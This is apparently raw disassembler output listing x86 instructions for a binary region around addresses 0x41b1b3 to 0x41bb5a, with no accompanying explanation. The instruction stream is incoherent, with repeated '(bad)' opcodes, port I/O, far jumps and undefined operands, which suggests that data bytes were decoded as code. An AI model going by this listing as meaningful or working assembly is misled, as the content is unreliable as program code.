  41b1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1b4:	jnp    0x41b19f
  41b1b6:	mov    al,ds:0x14a838e7
  41b1bb:	cmp    esp,edx
  41b1bd:	sar    BYTE PTR [eax-0x46],1
  41b1c0:	inc    ecx
  41b1c1:	int    0x96
  41b1c3:	cli    
  41b1c4:	imul   BYTE PTR [ebx-0x59]
  41b1c7:	mov    ecx,0x2b64451f
  41b1cc:	mov    BYTE PTR [ecx-0x65],dh
  41b1cf:	jmp    0x93e7:0x5eba9cb7
  41b1d6:	arpl   ax,si
  41b1d8:	fcomp  DWORD PTR [ebx]
  41b1da:	push   esp
  41b1db:	int    0x15
  41b1dd:	inc    edi
  41b1de:	pop    es
  41b1df:	nop
  41b1e0:	sbb    eax,0x3c82ca0d
  41b1e5:	test   eax,0xcbcfc398
  41b1ea:	jo     0x41b1c0
  41b1ec:	and    BYTE PTR [edx],bh
  41b1ee:	push   ds
  41b1ef:	mov    bh,0xca
  41b1f1:	cmp    BYTE PTR [ecx],ch
  41b1f3:	data16 adc BYTE PTR [ebp+0x55],bl
  41b1f7:	mov    dh,0x16
  41b1f9:	and    bh,bl
  41b1fb:	in     al,dx
  41b1fc:	out    0xd1,eax
  41b1fe:	mov    edi,0x564660f9
  41b203:	stc    
  41b204:	fmul   DWORD PTR [eax]
  41b206:	std    
  41b207:	or     ebp,DWORD PTR [esi+0x15]
  41b20a:	test   BYTE PTR [edx-0x5d66592],dh
  41b210:	xchg   edx,eax
  41b211:	out    dx,al
  41b212:	adc    edi,eax
  41b214:	lahf   
  41b215:	(bad)  
  41b216:	bound  eax,QWORD PTR [esi+0x19]
  41b219:	xchg   ebp,eax
  41b21a:	test   al,0xdf
  41b21c:	pop    ss
  41b21d:	fwait
  41b21e:	xchg   edi,eax
  41b21f:	cmp    DWORD PTR [ecx],edi
  41b221:	xlat   BYTE PTR ds:[ebx]
  41b222:	out    0x3f,al
  41b224:	sbb    BYTE PTR [ecx],dh
  41b226:	(bad)  
  41b227:	mov    ds:0xa9e8d0d1,eax
  41b22c:	push   edi
  41b22d:	mov    ?,WORD PTR [ebp-0x40]
  41b230:	lahf   
  41b231:	leave  
  41b232:	sub    bh,BYTE PTR ds:0x72e89a4
  41b238:	clc    
  41b239:	cmp    BYTE PTR [ecx+0x37072ef3],cl
  41b23f:	mov    al,ds:0xe27bea56
  41b244:	mov    eax,0x3315fec
  41b249:	xor    BYTE PTR [edx+0x6e],bh
  41b24c:	inc    ebx
  41b24d:	sar    eax,cl
  41b24f:	int3   
  41b250:	(bad)  
  41b251:	ret    0x9a97
  41b254:	fcom   QWORD PTR [eax-0x5]
  41b257:	pop    ebx
  41b258:	pcmpgtd mm0,QWORD PTR [ecx-0x71]
  41b25c:	adc    BYTE PTR [esi+0x52496811],bl
  41b262:	sbb    al,0x13
  41b264:	push   ecx
  41b265:	push   ss
  41b266:	pop    ss
  41b267:	mov    esi,0x31e93d5c
  41b26c:	xchg   edi,eax
  41b26d:	outs   dx,BYTE PTR ds:[esi]
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     dl,dh
  41b2e3:	dec    ebx
  41b2e4:	adc    ecx,DWORD PTR [ecx+0x67]
  41b2e7:	and    al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    BYTE PTR ds:0x8da4e387,ah
  41b2f3:	and    ebp,DWORD PTR [edx]
  41b2f5:	fucom  st(5)
  41b2f7:	and    ebp,esi
  41b2f9:	add    esi,DWORD PTR [edx+0x3]
  41b2fc:	aas    
  41b2fd:	push   edx
  41b2fe:	ss jp  0x41b32c
  41b301:	pop    esp
  41b302:	mov    BYTE PTR [eax-0xb],ah
  41b305:	xchg   ebp,eax
  41b306:	jle    0x41b35e
  41b308:	xchg   esp,eax
  41b309:	daa    
  41b30a:	lods   al,BYTE PTR ds:[esi]
  41b30b:	mov    ah,0x18
  41b30d:	scas   eax,DWORD PTR es:[edi]
  41b30e:	jmp    FWORD PTR [edi+0x32b4adc9]
  41b314:	jae    0x41b2ce
  41b316:	ret    
  41b317:	fdivr  DWORD PTR [edi+0x722c00bd]
  41b31d:	outs   dx,BYTE PTR ds:[esi]
  41b31e:	add    DWORD PTR [esi+0x65],ebx
  41b321:	xor    dl,dh
  41b323:	fist   DWORD PTR [ecx+0x7f]
  41b326:	sti    
  41b327:	(bad)  
  41b328:	ret    0x4641
  41b32b:	cmp    al,0x1d
  41b32d:	pop    edx
  41b32e:	cmc    
  41b32f:	mov    eax,0x267fed90
  41b334:	mov    ecx,0x3f425595
  41b339:	pop    es
  41b33a:	pop    ecx
  41b33b:	mov    ah,0xa
  41b33d:	cmc    
  41b33e:	shl    cl,0x1b
  41b341:	loope  0x41b2ce
  41b343:	lds    ebx,FWORD PTR [edx]
  41b345:	mov    ebp,0x93747d05
  41b34a:	rol    DWORD PTR [ecx+0xbb9223d],1
  41b350:	popf   
  41b351:	loope  0x41b331
  41b353:	cld    
  41b354:	mov    BYTE PTR [edx-0x18a4868f],bh
  41b35a:	fs dec ebx
  41b35c:	xor    DWORD PTR [esi-0x14],edi
  41b35f:	retf   
  41b360:	cwde   
  41b361:	xor    al,0x88
  41b363:	ins    DWORD PTR es:[edi],dx
  41b364:	(bad)  
  41b365:	cli    
  41b366:	xor    BYTE PTR [ebp+0x55852400],ch
  41b36c:	mov    ch,BYTE PTR [eax-0x120d963]
  41b372:	js     0x41b367
  41b374:	push   0xfffffffe
  41b376:	daa    
  41b377:	fmul   DWORD PTR [ecx+ebp*2]
  41b37a:	adc    bh,BYTE PTR [ecx-0x4f374a5c]
  41b380:	stos   DWORD PTR es:[edi],eax
  41b381:	hlt    
  41b382:	mov    ecx,0x357f40b2
  41b387:	lods   eax,DWORD PTR ds:[esi]
  41b388:	and    al,ah
  41b38a:	int3   
  41b38b:	mov    edi,0x2aa343
  41b390:	(bad)  
  41b391:	jmp    0x41b3ce
  41b393:	imul   edi,DWORD PTR [eax-0x1d42de73],0xa3b002a8
  41b39d:	cld    
  41b39e:	jmp    0x17306eda
  41b3a3:	adc    al,0xd2
  41b3a5:	bound  ebp,QWORD PTR [ebx+0x377938f9]
  41b3ab:	sub    DWORD PTR [edi+0x7b71a844],esp
  41b3b1:	inc    esi
  41b3b2:	and    eax,0xaf929889
  41b3b7:	test   al,0x55
  41b3b9:	or     eax,0xce547d5e
  41b3be:	mov    ch,0x9
  41b3c0:	adc    ecx,DWORD PTR [ebp-0xa1d0045]
  41b3c6:	xchg   DWORD PTR [edi-0x4e],ebx
  41b3c9:	mov    ch,0xfb
  41b3cb:	or     DWORD PTR [ecx-0x5daa76d1],0x3830b072
  41b3d5:	imul   ebp,ebx,0x7d
  41b3d8:	out    dx,al
  41b3d9:	jge    0x41b380
  41b3db:	js     0x41b3e1
  41b3dd:	push   edx
  41b3de:	loope  0x41b3bd
  41b3e0:	in     eax,0x5a
  41b3e2:	sbb    eax,0x19189048
  41b3e7:	test   BYTE PTR [esi-0x4d803c5c],dh
  41b3ed:	jbe    0x41b3ef
	...
  41b453:	add    BYTE PTR [eax],al
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	mov    cl,ah
  41b464:	add    al,0x3f
  41b466:	addr16 and eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	jmp    0x52de5a3b
  41b473:	scas   eax,DWORD PTR es:[edi]
  41b474:	pusha  
  41b475:	cli    
  41b476:	sub    DWORD PTR [edx+0x3002559a],0x9
  41b47d:	xor    BYTE PTR [ebx],al
  41b47f:	mov    cl,0x0
  41b481:	arpl   WORD PTR ds:0x8bb1c9ca,ax
  41b487:	jnp    0x41b409
  41b489:	jbe    0x41b4af
  41b48b:	and    ebx,DWORD PTR [esp+esi*2+0x6fa6ad50]
  41b492:	(bad)  
  41b493:	or     eax,0xb725a894
  41b498:	push   ebx
  41b499:	pop    ds
  41b49a:	lds    ebx,FWORD PTR [esi]
  41b49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b49d:	inc    ebp
  41b49e:	inc    esi
  41b49f:	addr16 popfw 
  41b4a2:	and    al,0xcc
  41b4a4:	push   edi
  41b4a5:	mov    esi,0xa46aaec4
  41b4aa:	push   es
  41b4ab:	push   ebp
  41b4ac:	sub    BYTE PTR [eax+0x3b8a22f4],bh
  41b4b2:	hlt    
  41b4b3:	mov    edx,0xf6b63b10
  41b4b8:	mov    esi,DWORD PTR [esi]
  41b4ba:	mov    ebx,DWORD PTR [ecx]
  41b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4bd:	imul   edx,DWORD PTR [edi-0x69],0x1b
  41b4c1:	sub    ebx,ebx
  41b4c3:	shl    DWORD PTR [ebx-0x20ed5e2],cl
  41b4c9:	cmp    eax,0xa6692bdf
  41b4ce:	int3   
  41b4cf:	cmc    
  41b4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d1:	mov    BYTE PTR [edi],bh
  41b4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d4:	mov    edx,0x8351e638
  41b4d9:	mov    ebp,0xed801e13
  41b4de:	in     eax,dx
  41b4df:	mov    ch,0x41
  41b4e1:	cmp    eax,0x14ee6ec6
  41b4e6:	je     0x41b49d
  41b4e8:	mul    BYTE PTR [bx+si+0x3d]
  41b4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ed:	inc    edi
  41b4ee:	call   0xf4bf2ed9
  41b4f3:	mov    WORD PTR [edx],es
  41b4f5:	fisubr WORD PTR [esp+ebx*4]
  41b4f8:	iret   
  41b4f9:	in     al,dx
  41b4fa:	cmp    eax,0xb9e82245
  41b4ff:	jno    0x41b563
  41b501:	mov    eax,0xc62cff40
  41b506:	out    0xf8,al
  41b508:	dec    eax
  41b509:	aas    
  41b50a:	pop    edi
  41b50b:	xchg   ecx,eax
  41b50c:	xchg   DWORD PTR [edi+0x7a1a0087],eax
  41b512:	sub    eax,0xd626dfe7
  41b517:	and    DWORD PTR [ebp-0x4b9d29bb],ebp
  41b51d:	aad    0x5
  41b51f:	xor    dh,BYTE PTR [edi+0xd]
  41b522:	call   FWORD PTR [edi+0x2fa22dae]
  41b528:	mov    ecx,?
  41b52a:	retf   
  41b52b:	jmp    0x41b521
  41b52d:	push   eax
  41b52e:	push   ds
  41b52f:	mov    WORD PTR [ebx-0x4358e55f],ds
  41b535:	dec    ebp
  41b536:	and    eax,0x35905c73
  41b53b:	mov    ah,0xfb
  41b53d:	cmp    al,0x3c
  41b53f:	outs   dx,BYTE PTR ds:[esi]
  41b540:	jg     0x41b594
  41b542:	xchg   ebx,eax
  41b543:	ret    0x97ed
  41b546:	adc    al,0xac
  41b548:	adc    ecx,edx
  41b54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b54b:	xchg   esi,eax
  41b54c:	and    eax,0x80653195
  41b551:	xor    esp,edx
  41b553:	ftst   
  41b555:	shr    BYTE PTR [eax],1
  41b557:	pusha  
  41b558:	sub    ah,BYTE PTR [ebx+0x6f]
  41b55b:	sbb    ebx,DWORD PTR [ecx]
  41b55d:	addr16 retf 
  41b55f:	sub    al,0x4d
  41b561:	xor    eax,0x8d6cef93
  41b566:	xchg   esp,eax
  41b567:	(bad)  
  41b568:	sbb    eax,0xa359c1f1
  41b56d:	add    DWORD PTR [eax],eax
	...
  41b5d3:	add    BYTE PTR [eax],al
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	retf   
  41b5e3:	sbb    edx,ebx
  41b5e5:	jo     0x41b64e
  41b5e7:	add    DWORD PTR es:[eax],eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	subps  xmm4,XMMWORD PTR [ecx+0x78]
  41b5f2:	mov    al,0x6a
  41b5f4:	dec    eax
  41b5f5:	into   
  41b5f6:	sbb    DWORD PTR [edi-0x4020d4],ebx
  41b5fc:	inc    esp
  41b5fd:	fdivr  DWORD PTR [edx+0x26b8e11d]
  41b603:	pop    ecx
  41b604:	pop    esp
  41b605:	jecxz  0x41b58d
  41b607:	sub    al,al
  41b609:	mov    WORD PTR [ebp-0x1014ca50],ds
  41b60f:	xor    BYTE PTR [edi-0x12725875],al
  41b615:	je     0x41b62c
  41b617:	gs retf 
  41b619:	xchg   ebp,eax
  41b61a:	dec    esp
  41b61b:	jb     0x41b610
  41b61d:	sub    bh,BYTE PTR [ebx-0x3697d2cb]
  41b623:	scas   eax,DWORD PTR es:[edi]
  41b624:	adc    DWORD PTR [ebx-0x3c],ebx
  41b627:	sub    bh,ch
  41b629:	xor    cl,0x69
  41b62c:	aam    0xaa
  41b62e:	xchg   edi,eax
  41b62f:	push   edx
  41b630:	push   ecx
  41b631:	jb     0x41b5bd
  41b633:	pop    edx
  41b634:	(bad)  
  41b635:	in     eax,0x5a
  41b637:	mov    esp,0xb1aae3
  41b63c:	add    cl,BYTE PTR [ecx]
  41b63e:	daa    
  41b63f:	jmp    0x927b:0x2c69680f
  41b646:	fs mov al,0x16
  41b649:	pop    ss
  41b64a:	pop    ebx
  41b64b:	dec    edi
  41b64c:	push   esp
  41b64d:	mov    BYTE PTR [edi],ah
  41b64f:	mov    ds:0xcfac1a0b,eax
  41b654:	ja     0x41b6a3
  41b656:	pop    eax
  41b657:	xchg   esi,eax
  41b658:	sbb    eax,0xa0a22a3a
  41b65d:	mov    eax,0x59f73b6d
  41b662:	push   cs
  41b663:	pop    edx
  41b664:	aaa    
  41b665:	and    DWORD PTR ds:0xfb000be3,ebx
  41b66b:	dec    edx
  41b66c:	inc    edi
  41b66d:	xchg   DWORD PTR [bx+di-0x4a],ecx
  41b671:	fisubr WORD PTR [eax-0x6dc2a149]
  41b677:	cmp    ecx,DWORD PTR [ebx+eiz*2]
  41b67a:	or     DWORD PTR [esi+0x42decf52],ebp
  41b680:	es dec edi
  41b682:	sub    al,0xd4
  41b684:	xchg   edx,eax
  41b685:	jo     0x41b637
  41b687:	dec    ebx
  41b688:	(bad)  
  41b689:	lods   eax,DWORD PTR ds:[esi]
  41b68a:	fimul  WORD PTR [edx+0x565e4d2a]
  41b690:	pop    eax
  41b691:	int3   
  41b692:	or     al,0xb9
  41b694:	jecxz  0x41b6d6
  41b696:	loope  0x41b70b
  41b698:	fwait
  41b699:	inc    edi
  41b69a:	ins    BYTE PTR es:[edi],dx
  41b69b:	jns    0x41b6d4
  41b69d:	outs   dx,DWORD PTR ds:[esi]
  41b69e:	shl    BYTE PTR ds:0x3fc8808a,cl
  41b6a4:	retf   
  41b6a5:	ret    
  41b6a6:	jnp    0x41b63e
  41b6a8:	xchg   edi,eax
  41b6a9:	adc    BYTE PTR [edx+0x6b559e4c],cl
  41b6af:	stc    
  41b6b0:	cmp    ebp,esi
  41b6b2:	sbb    esp,DWORD PTR [edx+0x5b]
  41b6b5:	pop    edi
  41b6b6:	dec    edx
  41b6b7:	aam    0xec
  41b6b9:	mov    cs:0x774c7899,eax
  41b6bf:	(bad)  
  41b6c0:	pop    ecx
  41b6c1:	cmp    bh,BYTE PTR [ebp-0x54fa5c87]
  41b6c7:	jnp    0x41b651
  41b6c9:	pusha  
  41b6ca:	fwait
  41b6cb:	dec    ebx
  41b6cc:	mov    ecx,0x71674a1d
  41b6d1:	xor    BYTE PTR [ebp*4-0x2011a901],0x19
  41b6d9:	sub    eax,0x807cffac
  41b6de:	clc    
  41b6df:	jmp    0x66e3:0x14bb8781
  41b6e6:	lahf   
  41b6e7:	retf   0xe2e3
  41b6ea:	inc    edx
  41b6eb:	test   eax,0xb868
	...
  41b754:	add    BYTE PTR [eax],al
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	sbb    al,0x7c
  41b764:	sbb    DWORD PTR [ebx+0x12767],edi
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	les    ebx,FWORD PTR [esi+0x697338eb]
  41b774:	or     DWORD PTR [edi+0x7b724c5c],esi
  41b77a:	sub    ebp,esp
  41b77c:	add    bh,BYTE PTR [eax+ecx*1-0x37696039]
  41b783:	mov    ebp,0xcfc2e17c
  41b788:	xlat   BYTE PTR ds:[ebx]
  41b789:	sbb    BYTE PTR [edi+0x11],ah
  41b78c:	or     BYTE PTR [ebp+0x9],ch
  41b78f:	mov    es,WORD PTR [ebx-0x78146149]
  41b795:	out    dx,eax
  41b796:	cmp    BYTE PTR [edi],cl
  41b798:	nop
  41b799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b79a:	mov    DWORD PTR [ebx],ebp
  41b79c:	aam    0x1d
  41b79e:	sti    
  41b79f:	sbb    al,BYTE PTR [esi]
  41b7a1:	in     eax,0xac
  41b7a3:	dec    eax
  41b7a4:	in     al,dx
  41b7a5:	xor    ch,BYTE PTR [ecx-0x4876f709]
  41b7ab:	stc    
  41b7ac:	mov    gs,edx
  41b7ae:	jns    0x41b7f4
  41b7b0:	mov    eax,ebx
  41b7b2:	mov    bh,0xd6
  41b7b4:	test   al,0xd8
  41b7b6:	ret    
  41b7b7:	std    
  41b7b8:	or     esp,DWORD PTR [ebp+0x7185399c]
  41b7be:	jg     0x41b744
  41b7c0:	pop    esp
  41b7c1:	xchg   esi,eax
  41b7c2:	mov    ebp,0x4113283f
  41b7c7:	(bad)  
  41b7c8:	pop    edi
  41b7c9:	mov    ds:0xabb44d1,eax
  41b7ce:	cmp    eax,DWORD PTR [esi]
  41b7d0:	sbb    al,0xbd
  41b7d2:	shr    BYTE PTR [edi],cl
  41b7d4:	cmp    cl,cl
  41b7d6:	and    DWORD PTR [ecx-0x3094fbfd],edx
  41b7dc:	xchg   esi,eax
  41b7dd:	rol    DWORD PTR [eax+ecx*2+0x1b],cl
  41b7e1:	sbb    DWORD PTR [edx+0x4a],edi
  41b7e4:	bound  edx,QWORD PTR [esi]
  41b7e6:	mov    bh,ch
  41b7e8:	les    ebx,FWORD PTR [edi-0x2555d312]
  41b7ee:	popa   
  41b7ef:	pop    ds
  41b7f0:	gs adc ecx,0x7b
  41b7f4:	js     0x41b7a6
  41b7f6:	in     eax,0xea
  41b7f8:	ror    DWORD PTR [eax+0x44d34036],1
  41b7fe:	xchg   ebx,eax
  41b7ff:	jge    0x41b857
  41b801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b802:	cld    
  41b803:	ss sub eax,0x5b81174a
  41b809:	mov    ?,eax
  41b80b:	inc    eax
  41b80c:	loope  0x41b859
  41b80e:	ins    DWORD PTR es:[edi],dx
  41b80f:	adc    ch,BYTE PTR [esi+0x5d]
  41b812:	pop    es
  41b813:	cmp    eax,DWORD PTR [ebx-0x5f344792]
  41b819:	scas   eax,DWORD PTR es:[edi]
  41b81a:	mov    eax,ds:0x12598b7a
  41b81f:	xchg   ebp,eax
  41b820:	retf   
  41b821:	dec    eax
  41b822:	arpl   WORD PTR [esi-0x6ed7b6af],si
  41b828:	sub    BYTE PTR ds:0xf326d369,dh
  41b82e:	imul   ebx,DWORD PTR [ecx-0xc37f61d],0x5d
  41b835:	arpl   WORD PTR [edx],di
  41b837:	inc    esi
  41b838:	stos   DWORD PTR es:[edi],eax
  41b839:	ins    DWORD PTR es:[edi],dx
  41b83a:	push   edx
  41b83b:	cmc    
  41b83c:	push   edi
  41b83d:	pushf  
  41b83e:	call   0x2b9d1c7c
  41b843:	shr    DWORD PTR [edi+0x7df2053d],0xc5
  41b84a:	jp     0x41b7d4
  41b84c:	mov    bl,0xd0
  41b84e:	data16 xchg bl,dh
  41b851:	mov    ds:0xc171e1df,al
  41b856:	scas   al,BYTE PTR es:[edi]
  41b857:	push   esp
  41b858:	jmp    0x808f:0x2332142
  41b85f:	push   ss
  41b860:	cdq    
  41b861:	stc    
  41b862:	aam    0x6e
  41b864:	push   ebp
  41b865:	sub    al,0xaf
  41b867:	leave  
  41b868:	jae    0x41b89e
  41b86a:	and    ebp,esi
  41b86c:	cs sbb al,0x0
	...
  41b8d3:	add    BYTE PTR [eax],al
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x1c
  41b8e3:	or     eax,0x2867e8db
  41b8e8:	add    DWORD PTR [eax],eax
  41b8ea:	add    BYTE PTR [ecx],al
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	int3   
  41b8ef:	xor    BYTE PTR [eax-0x4adfd804],bl
  41b8f5:	idiv   BYTE PTR [ebp+edi*8+0x5a]
  41b8f9:	test   DWORD PTR [ecx],esp
  41b8fb:	and    bh,BYTE PTR [esi-0x30]
  41b8fe:	int    0xf1
  41b900:	fmulp  st(6),st
  41b902:	and    BYTE PTR [ebp-0x76],dl
  41b905:	cs push 0xf
  41b908:	pop    ecx
  41b909:	inc    edx
  41b90a:	scas   eax,DWORD PTR es:[edi]
  41b90b:	jl     0x41b8cb
  41b90d:	cdq    
  41b90e:	je     0x41b90f
  41b910:	fwait
  41b911:	in     al,dx
  41b912:	repz sub eax,0x5cb128fd
  41b918:	sub    esi,DWORD PTR [ebp+0x2e]
  41b91b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41b91d:	enter  0x898b,0x85
  41b921:	mov    ds:0x6ae435f0,al
  41b926:	jmp    0x41b8aa
  41b928:	xchg   edx,eax
  41b929:	adc    ebp,DWORD PTR [edx-0x35]
  41b92c:	sub    eax,0xe0567214
  41b931:	int    0xf8
  41b933:	or     ebx,DWORD PTR cs:[edi+ecx*4-0x7510f50b]
  41b93b:	jl     0x41b933
  41b93d:	arpl   WORD PTR [ecx],di
  41b93f:	(bad)  
  41b940:	jp     0x41b933
  41b942:	mov    fs,eax
  41b944:	adc    al,0x84
  41b946:	gs fcmovnu st,st(6)
  41b949:	ins    BYTE PTR es:[edi],dx
  41b94a:	shl    BYTE PTR [eax-0x16],1
  41b94d:	mov    edi,0x24e4d561
  41b952:	lods   eax,DWORD PTR ds:[esi]
  41b953:	cld    
  41b954:	jae    0x41b96d
  41b956:	push   ebx
  41b957:	fimul  DWORD PTR [eax-0x6b892258]
  41b95d:	mov    eax,gs
  41b95f:	lods   eax,DWORD PTR ds:[esi]
  41b960:	(bad)
  41b963:	add    BYTE PTR [edi-0x52ed4703],ch
  41b969:	cmp    eax,DWORD PTR [ecx-0x2]
  41b96c:	test   DWORD PTR ss:[edx],edx
  41b96f:	pop    esp
  41b970:	pop    ss
  41b971:	out    dx,eax
  41b972:	mov    BYTE PTR [ebx-0x5031a9be],0x6b
  41b979:	hlt    
  41b97a:	inc    ecx
  41b97b:	mov    bh,0xc6
  41b97d:	xlat   BYTE PTR ds:[ebx]
  41b97e:	adc    BYTE PTR [eax-0x77e7c267],dh
  41b984:	jae    0x41b945
  41b986:	mov    al,al
  41b988:	mov    WORD PTR [ebx],cs
  41b98a:	xchg   edx,eax
  41b98b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b98c:	(bad)  
  41b98d:	pop    ds
  41b98e:	adc    ebp,DWORD PTR [ebx+ebx*8-0xe79d68f]
  41b995:	pushf  
  41b996:	retf   
  41b997:	or     dh,BYTE PTR [ecx+eax*1]
  41b99a:	mov    DWORD PTR [ebx-0x448a66da],esi
  41b9a0:	stos   DWORD PTR es:[edi],eax
  41b9a1:	inc    esi
  41b9a2:	out    dx,eax
  41b9a3:	xor    al,0xa9
  41b9a5:	jno    0x41b984
  41b9a7:	test   eax,0x96e72414
  41b9ac:	test   eax,0xffb967b8
  41b9b1:	add    BYTE PTR [edi+esi*4+0x38],bh
  41b9b5:	or     bh,BYTE PTR [ebx]
  41b9b7:	jne    0x41b9c0
  41b9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9ba:	and    eax,DWORD PTR [ebp+0xa5432b4]
  41b9c0:	sbb    bl,BYTE PTR [ebp+0x28]
  41b9c3:	mov    DWORD PTR [eax+0x75471eaa],ebx
  41b9c9:	inc    eax
  41b9ca:	add    DWORD PTR [ecx+ebx*1+0x12],ecx
  41b9ce:	cld    
  41b9cf:	inc    ebp
  41b9d0:	shr    BYTE PTR [ecx-0x1f],1
  41b9d3:	push   es
  41b9d4:	cmc    
  41b9d5:	test   ah,bl
  41b9d7:	pop    ebx
  41b9d8:	xlat   BYTE PTR ds:[ebx]
  41b9d9:	nop
  41b9da:	push   ds
  41b9db:	out    0x46,al
  41b9dd:	xlat   BYTE PTR ds:[ebx]
  41b9de:	(bad)  
  41b9df:	in     eax,dx
  41b9e0:	iret   
  41b9e1:	stc    
  41b9e2:	enter  0xd23c,0x95
  41b9e6:	out    0x8e,eax
  41b9e8:	pop    ebp
  41b9e9:	xor    eax,0x79602e2c
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	dec    edi
  41ba63:	aaa    
  41ba64:	hlt    
  41ba65:	test   eax,0x12967
  41ba6a:	add    BYTE PTR [ecx],al
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba6f:	xor    esp,ebp
  41ba71:	in     eax,0x7c
  41ba73:	pusha  
  41ba74:	adc    edx,DWORD PTR [ebx+0xe86ad0b]
  41ba7a:	stos   BYTE PTR es:[edi],al
  41ba7b:	(bad)  
  41ba7d:	sub    eax,0x93ae4e91
  41ba82:	fbld   TBYTE PTR [esi-0x2b]
  41ba85:	add    DWORD PTR [eax-0x53],eax
  41ba88:	adc    al,0xcb
  41ba8a:	cmc    
  41ba8b:	mov    ecx,cs
  41ba8d:	cld    
  41ba8e:	jle    0x41baa4
  41ba90:	adc    edx,edx
  41ba92:	leave  
  41ba93:	dec    ebx
  41ba94:	fcom   QWORD PTR [eax]
  41ba96:	mov    esp,DWORD PTR [ebx+ecx*4+0x4d]
  41ba9a:	bound  eax,QWORD PTR [esi+0x55]
  41ba9d:	fdivp  st(6),st
  41ba9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa0:	and    eax,0xa62c6631
  41baa5:	(bad)  [eax+edi*1+0x13]
  41baa9:	int    0x59
  41baab:	add    eax,0x28ad4bd
  41bab0:	jae    0x41ba77
  41bab2:	inc    edi
  41bab3:	jae    0x41ba58
  41bab5:	fcom   DWORD PTR [ebx]
  41bab7:	jno    0x41ba4f
  41bab9:	ins    BYTE PTR es:[edi],dx
  41baba:	or     eax,0xcea887ec
  41babf:	popa   
  41bac0:	or     eax,0x4a709daf
  41bac5:	pop    es
  41bac6:	push   0xa9e4a2bc
  41bacb:	jne    0x41babc
  41bacd:	(bad)  
  41bace:	cwde   
  41bacf:	in     al,0xd1
  41bad1:	sub    BYTE PTR [ebx+0x3cb2bc4d],ah
  41bad7:	ficom  WORD PTR [edx]
  41bad9:	aam    0xe4
  41badb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41badc:	(bad)  
  41badd:	(bad)  
  41badf:	mov    bl,0x90
  41bae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae2:	jnp    0x41bb32
  41bae4:	hlt    
  41bae5:	pop    ebp
  41bae6:	aas    
  41bae7:	sbb    eax,0xc56f2cfb
  41baec:	pushf  
  41baed:	call   0x3ce471b5
  41baf2:	(bad)  
  41baf3:	sub    eax,0x663ca73a
  41baf8:	retf   
  41baf9:	jecxz  0x41ba92
  41bafb:	or     DWORD PTR [ecx-0x2062a7e8],esi
  41bb01:	fcomp  DWORD PTR [ecx]
  41bb03:	sub    al,0x8a
  41bb05:	push   esp
  41bb06:	or     al,0x5
  41bb08:	or     bl,ah
  41bb0a:	jmp    0x41bad7
  41bb0c:	mov    eax,ds:0xe16e3559
  41bb11:	test   BYTE PTR [ecx+ecx*2-0x38],ch
  41bb15:	clc    
  41bb16:	xchg   esp,eax
  41bb17:	add    al,0xf8
  41bb19:	ror    BYTE PTR [eax+0x48],1
  41bb1c:	cmc    
  41bb1d:	mov    WORD PTR [ebx-0x49ebdbb9],ds
  41bb23:	adc    BYTE PTR [ebx+0x234c9b47],cl
  41bb29:	push   0xffffffcc
  41bb2b:	lods   eax,DWORD PTR ds:[esi]
  41bb2c:	sbb    DWORD PTR [edx],0x686f9ee7
  41bb32:	hlt    
  41bb33:	pushf  
  41bb34:	pop    ebx
  41bb35:	jecxz  0x41bb2b
  41bb37:	push   ebx
  41bb38:	retf   
  41bb39:	jmp    0xb4d:0x8363cf1d
  41bb40:	cs mov fs,esi
  41bb43:	rcl    bl,0x5d
  41bb46:	mov    edi,0x86ebd77a
  41bb4b:	cmp    ebx,DWORD PTR [ecx]
  41bb4d:	inc    edi
  41bb4e:	dec    esi
  41bb4f:	cdq    
  41bb50:	jl     0x41bb0f
  41bb52:	das    
  41bb53:	popa   
  41bb54:	and    cl,ah
  41bb56:	sar    DWORD PTR [ebx+ecx*2+0x50],cl
  41bb5a:	cmp    DWORD PTR [ebx+0x73fe6c8d],esi
